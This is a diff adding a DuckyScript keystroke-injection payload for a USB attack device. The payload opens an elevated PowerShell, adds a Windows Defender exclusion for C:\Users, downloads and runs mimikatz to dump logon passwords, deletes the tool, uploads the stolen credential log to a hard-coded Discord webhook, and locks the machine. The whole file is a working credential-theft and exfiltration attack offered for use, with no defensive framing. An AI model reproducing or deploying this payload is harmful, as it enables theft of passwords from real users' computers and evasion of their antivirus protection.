@@ -1,0 +1,141 @@
+DEFAULT_DELAY 350
+DELAY 1000
+
+REM Open Run dialog
+GUI r
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 600
+ALT y
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+STRING exit
+ENTER
+
+REM -------------download mimikatz
+DELAY 500
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Open Run dialog
+GUI r
+DELAY 500
+REM Type PowerShell and run as administrator
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+REM Wait for PowerShell to open
+ALT y
+DELAY 500
+REM Define the URL to the raw Mimikatz executable
+STRING $url = 'https://github.com/ebalo55/mimikatz/raw/main/x64/mimikatz.exe'
+ENTER
+DELAY 500
+REM Define the local path to save the file
+STRING $outfile = "$env:USERPROFILE\Desktop\mimikatz.exe"
+ENTER
+DELAY 500
+REM Download the file using Invoke-WebRequest
+STRING Invoke-WebRequest -Uri $url -OutFile $outfile
+ENTER
+DELAY 1000
+REM Unblock the file if needed
+STRING Unblock-File -Path $outfile
+ENTER
+
+REM ------------run Mimikatz commands and save results
+DELAY 5000
+
+REM Open Command Prompt with admin privileges
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+
+REM Run Mimikatz and save results to a text file on the desktop
+STRING %USERPROFILE%\Desktop\mimikatz.exe > %USERPROFILE%\Desktop\pwlog.txt
+ENTER
+
+STRING privilege::debug
+ENTER
+STRING log pwlog.txt
+ENTER
+STRING sekurlsa::logonPasswords full
+ENTER
+STRING sekurlsa::wdigest
+ENTER
+STRING sekurlsa::minidump lsass.dmp
+ENTER
+STRING sekurlsa::logonPasswords
+ENTER
+STRING exit
+ENTER
+
+REM < --------- delete Mimikatz
+DELAY 1000
+STRING del %USERPROFILE%\Desktop\mimikatz.exe
+ENTER
+
+
+REM -------------send the information to Discord webhook
+DELAY 1000
+REM Open PowerShell with admin privileges
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING $hookurl = "https://discord.com/api/webhooks/1204159474454106154/PgMw-oiBBe7BhCWBXGwQGCaYBvslSrgVqdYa_VRvzUIqpyy8ZhMWkoqMD6j_YbmeRE22"
+ENTER
+DELAY 500
+STRING $userDir = "$env:userprofile\desktop\pwlog.txt"
+ENTER
+DELAY 500
+STRING $boundary = [guid]::NewGuid().ToString()
+ENTER
+ENTER
+DELAY 500
+STRING $body = @"
+ENTER
+STRING --$boundary
+ENTER
+STRING Content-Disposition: form-data; name="file"; filename="$($userDir | Split-Path -Leaf)"
+ENTER
+STRING Content-Type: application/octet-stream
+ENTER
+ENTER
+STRING $(Get-Content -Raw -LiteralPath $userDir)
+ENTER
+ENTER
+STRING --$boundary
+ENTER
+STRING Content-Disposition: form-data; name="username"
+ENTER
+ENTER
+STRING $($env:username)
+ENTER
+STRING --$boundary--
+ENTER
+STRING "@
+ENTER
+ENTER
+STRING $headers = @{ 'Content-Type' = "multipart/form-data; boundary=$boundary" }
+ENTER
+ENTER
+STRING $response = Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -Body $body
+ENTER
+ENTER
+STRING $response
+ENTER
+
+STRING exit
+ENTER
+STRING exit
+ENTER
+STRING exit
+ENTER
+
+REM ------lock the PC
+GUI l
